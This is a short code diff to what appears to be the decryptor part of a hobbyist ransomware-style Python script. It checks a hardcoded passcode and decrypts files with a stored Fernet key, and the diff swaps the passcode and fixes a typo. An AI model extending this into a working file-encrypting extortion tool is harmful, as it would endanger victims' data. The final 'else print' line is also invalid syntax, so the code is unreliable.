@@ -20,10 +20,10 @@ with open("theykey.key", "rb") as key:
 
 
 
-passcode = "Wingardium Leviosa"
+passcode = "passcode" #change passcode here
 
 
-usrinput = input("Enter the passcode to decrypt your files\n")
+usrinput = input("Enter passcode to decrypt your files: \n")
 
 
 if usrinput == passcode :
@@ -33,5 +33,5 @@ if usrinput == passcode :
                 decrypted = Fernet(secretkey).decrypt(contents)
                 with open(file, "wb") as thefile:
                         thefile.write(decrypted)
-                print("You're files have been decrypted")
+                print("Your files have been decrypted")
 else print("Wrong passcode")
